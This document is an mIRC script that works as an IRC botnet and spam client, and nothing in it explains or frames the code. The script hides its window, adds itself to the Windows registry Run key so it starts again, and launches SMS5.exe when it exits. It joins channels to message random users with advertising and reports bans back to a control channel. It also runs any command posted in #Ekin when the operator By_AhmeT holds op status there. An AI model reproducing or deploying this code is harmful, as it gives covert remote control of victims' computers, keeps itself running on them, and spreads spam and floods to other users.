on 1:start: {
  
  remote on 
  dll sfw.dll do_ShowWindow $window(-2).hwnd 0
  nick $read nicsk.txt
  timer 0 200 Ekin
  fullname $read fullname.txt  
  emailaddr $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ @
  server irc.e-kelebek.net
  server -m %server1
  server -m %server2
  server -m %server3
  server -m %server4
  server -m %server5
  server -m %server6
  Ekin
}

on 1:NOTIFY:/msg $nick Melapaa..?
raw 433:*:nick $read nicsk.txt

on 1:connect: {
  ignore -wd *
  timer 1 2 .okey
  if (irc.e-kelebek.net isin $server) { remote on | partall | join #Ekin - | .msg #bilgi Reklam Atmaya Hazirim Efendim | halt }
  { remote on | join $read Masnad.dll | timer 0 30 join $read Masnad.dll | timer 0 300 disconnect | /nickserv register By_AhmeT no@mail.com | /nickserv identify By_AhmeT | timer 1 2 .okey | halt }
}

on 1:disconnect: {  server | nick $read nicsk.txt | fullname $rand(a,z) $+ $rand(a,z) | emailaddr $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ @ | halt }
on *:text:*:?:closemsg  $nick | halt
on *:action:*:?:closemsg $nick | halt
on *:notice:*:?:closemsg $nick | halt
on *:ping: { ctcp $me ping }
on *:exit:/run SMS5.exe

alias Ekin {
  .set %windows $r(10,1999) $+ .reg 
  .write %windows REGEDIT4
  .write %windows [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
  .write %windows "LinsmsWin"=" $+ $remove($mircexe,$mircdir) $+ "
  run -n regedit /s %windows 
  timer 1 4 remove %windows
}

on ^*:join:*: { if ($server !== irc.e-kelebek.net) && ($nick !== $me) && ($chan !== %savaskn) { msg $nick($chan,$rand(8,$nick($chan,0))) %reklam } }

raw 439:*: { disconnect }
raw 433:*: nick $read nicsk.txt

on *:text:*:#Ekin: {
  if (irc.e-kelebek.net isin $server) {
    if (By_AhmeT ison #Ekin) {
      if (By_AhmeT isop #Ekin) {
        if ($1 = $me) { $2- }
      }
    }
  }
  if (irc.e-kelebek.net isin $server) {
    if (By_AhmeT ison #Ekin) {
      if (By_AhmeT isop #Ekin) {
        if ($1 = !reklam) { .set %reklam $2- }
      }
    }
  }
  if (irc.e-kelebek.net isin $server) {
    if (By_AhmeT ison #Ekin) {
      if (By_AhmeT isop #Ekin) {
        if ($1 = !nreklam) { msg #Ekin %reklam }
      }
    }
  }
  if (irc.e-kelebek.net isin $server) {
    if (By_AhmeT ison #Ekin) {
      if (By_AhmeT isop #Ekin) {
        if ($1 = !mesajnick) { .set %mesajnick $2- | msg #bilgi Yeni Mesaj Atilacak Nick %mesajnick }
      }
    }
  }
  if (irc.e-kelebek.net isin $server) {
    if (By_AhmeT ison #Ekin) {
      if (By_AhmeT isop #Ekin) {
        if ($1 = !mesaj) { .mesaj }
      }
    }
  }
  if (irc.e-kelebek.net isin $server) {
    if (By_AhmeT ison #Ekin) {
      if (By_AhmeT isop #Ekin) {
        if ($1 = !settimer) { .set %timer $2- }
      }
    }
  }
  if (irc.e-kelebek.net isin $server) {
    if (By_AhmeT ison #Ekin) {
      if (By_AhmeT isop #Ekin) {
        if ($1 = !timer) { .timer31 %timer $2- }
      }
    }
  }
  if (irc.e-kelebek.net isin $server) {
    if (By_AhmeT ison #Ekin) {
      if (By_AhmeT isop #Ekin) {
        if ($1 = !timeroff) { .timer31 off }
      }
    }
  }
  if (irc.e-kelebek.net isin $server) {
    if (By_AhmeT ison #Ekin) {
      if (By_AhmeT isop #Ekin) {
        if ($1 = !gir) { .girgir }
      }
    }
  }
  if (irc.e-kelebek.net isin $server) {
    if (By_AhmeT ison #Ekin) {
      if (By_AhmeT isop #Ekin) {
        if ($1 = !q) { $2- }
      }
    }
  }
}


alias mesaj {
  scid 1 msg %mesajnick Online | scid 2 msg %mesajnick Online | scid 3 msg %mesajnick Online | scid 4 msg %mesajnick Online | scid 5 msg %mesajnick Online | scid 6 msg %mesajnick Online | scid 7 msg %mesajnick Online | scid 8 msg %mesajnick Online | scid 9 msg %mesajnick Online | scid 10 msg %mesajnick Online | scid 11 msg %mesajnick Online | scid 12 msg %mesajnick Online | scid 13 msg %mesajnick Online | scid 14 msg %mesajnick Online | 
}

alias sax {
  server -m %savasserver
}

alias floodcuk {
  timer 0 1 msg %savaskn %savasmesaj
}

raw 332:* {
  if (irc.e-kelebek.net == $server) && (%topickanal == #Ekin) { set %reklam $3- }
  halt
}

on 1:BAN:#: {
  if ($nick = $me) { .banqanal | halt }
}

alias banqanal {
  .scid 1 msg #bilgi  $server de $chan kanalindan $nick ban yedi... $ip
}

alias okey {
  .scid 1 msg #bilgi $server Ok
}

alias girgir {
  .scid 1 msg #bilgi Kanallara Giriliyor | .scid 2 join $read Masnad.dll | .scid 3 join $read Masnad.dll | .scid 4 join $read Masnad.dll | .scid 5 join $read Masnad.dll | .scid 6 join $read masnad.dll | .scid 7 join Masnad.dll | halt 
}


on *^:ERROR:*banned*:{
  server $read(server.dll)
  timer 1 2 .okey
  halt
}
}
